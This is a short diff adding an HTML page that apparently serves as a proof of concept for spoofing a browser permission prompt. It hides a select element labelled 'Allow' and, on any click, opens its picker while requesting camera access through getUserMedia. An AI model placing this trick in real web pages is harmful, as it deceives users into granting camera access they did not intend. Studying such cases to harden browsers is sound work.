@@ -1,0 +1,36 @@
+<select id="select">
+    <option>Request Notification..</option>
+    <option>Allow</option>
+</select>
+
+<style>
+#select {
+    opacity: 0;
+    pointer-events: none;
+    position: absolute;
+}
+</style>
+
+<script>
+document.addEventListener("click", async () => {
+    const select = document.getElementById("select");
+
+    if (select.showPicker) {
+        try {
+            select.showPicker();
+        } catch (e) {
+            console.error(e);
+        }
+    }
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true
+        });
+
+        console.log("Camera granted:", stream);
+    } catch (err) {
+        console.error(err);
+    }
+});
+</script>
